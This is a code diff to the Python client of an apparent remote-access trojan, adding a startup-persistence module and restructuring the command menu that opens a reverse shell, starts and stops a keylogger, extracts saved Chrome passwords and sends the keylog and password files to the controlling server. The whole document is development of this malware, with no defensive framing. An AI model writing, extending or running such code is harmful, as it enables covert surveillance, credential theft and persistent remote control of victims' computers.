@@ -3,6 +3,7 @@ from rev_shell import Shell
 import socket
 from chrome_passwords import ChromePass
 from keylogger import KeyLogger
+from startup import Startup
 import os
 
 
@@ -50,52 +51,58 @@ class Client:
         # Initialize keylogger instance
         self.keylogger = KeyLogger(self.keylog_filename)
 
+        # Initialize startup instance
+        self.startup = Startup()
+
     def run(self) -> None:
         """
-        1. Stores google chrome passwords to file
+        1. Stores Google Chrome passwords to file
         2. Starts logging key events to file
         3. Gets a reverse shell from client to server
         """
 
         while 1:
 
-            # Try connection with Ctrl-C handling
             try:
+                # Opens menu
                 choice = self.open_menu()
-            except (ConnectionResetError, ConnectionAbortedError, ConnectionError, ConnectionAbortedError):
+
+                if choice == 1:
+                    self.shell.get_shell()
+
+                elif choice == 2:
+                    self.keylogger.start_log()
+                    self.send_data("\n\nKey logging started to file '{}'...".format(self.keylog_filename), self.sock)
+
+                elif choice == 3:
+                    self.keylogger.end_log()
+                    self.send_data("\n\nKey logging stopped...", self.sock)
+
+                elif choice == 4:
+                    self.chrome_pass.get_chrome_pass()
+                    self.send_data("\n\nChrome passwords saved to file '{}'...".format(self.chromepass_filename),
+                                   self.sock)
+
+                elif choice == 5:
+                    self.startup.add_startup()
+                    self.send_data("\n\nProgram added to startup successfully...", self.sock)
+
+                elif choice == 6:
+                    self.startup.remove_startup()
+                    self.send_data("\n\nProgram removes from startup successfully...", self.sock)
+
+                elif choice == 7:
+                    self.send_file(self.keylog_filename)
+                    self.send_data("\n\n{} sent and deleted from client...".format(self.keylog_filename), self.sock)
+
+                elif choice == 8:
+                    self.send_file(self.chromepass_filename)
+                    self.send_data("\n\n{} sent and deleted from client...".format(self.chromepass_filename), self.sock)
+
+            # Connection error handling (e.g. server presses Ctrl-C)
+            except (ConnectionResetError, ConnectionAbortedError, ConnectionError):
                 self.sock.close()
                 break
-
-            if choice == 1:
-                self.shell.get_shell()
-
-            elif choice == 2:
-                self.keylogger.start_log()
-                self.send_data("\n\nKey logging started to file '{}'...".format(self.keylog_filename), self.sock)
-
-            elif choice == 3:
-                self.keylogger.end_log()
-                self.send_data("\n\nKey logging stopped...", self.sock)
-
-            elif choice == 4:
-                self.chrome_pass.get_chrome_pass()
-                self.send_data("\n\nChrome passwords saved to file '{}'...".format(self.chromepass_filename), self.sock)
-
-            elif choice == 5:
-                # ToDo
-                pass
-
-            elif choice == 6:
-                # ToDo
-                pass
-
-            elif choice == 7:
-                self.send_file(self.keylog_filename)
-                self.send_data("\n\n{} sent and deleted from client...".format(self.keylog_filename), self.sock)
-
-            elif choice == 8:
-                self.send_file(self.chromepass_filename)
-                self.send_data("\n\n{} sent and deleted from client...".format(self.chromepass_filename), self.sock)
 
     def open_menu(self) -> int:
         """
